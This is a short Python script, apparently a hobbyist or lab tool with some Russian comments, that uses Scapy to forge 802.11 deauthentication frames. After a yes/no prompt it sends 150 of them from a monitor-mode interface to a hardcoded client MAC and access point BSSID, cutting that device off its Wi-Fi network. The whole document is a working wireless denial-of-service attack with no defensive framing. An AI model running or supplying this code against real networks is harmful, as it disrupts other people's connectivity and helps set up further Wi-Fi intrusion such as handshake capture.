from scapy.all import*

iface = 'wlan0mon'
devices = set()

def perform_deauth(bssid, client, count):
  
    # Сформируем пакет 802.11:
    dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    for n in range(int(count)):
        sendp(packet)

print("Do you want to perform a client deauthentication attack? (Y/n): ")
str1 = input()
if str1 == "Y":
    # print("Введите mac клиента которого нужно деаутентифицировать")
    client = "2e:73:c6:3e:db:c5"
    # print("Введите bssid точки доступа")
    bssid = "3c:84:6a:49:46:f5"
    perform_deauth(bssid, client, 150)
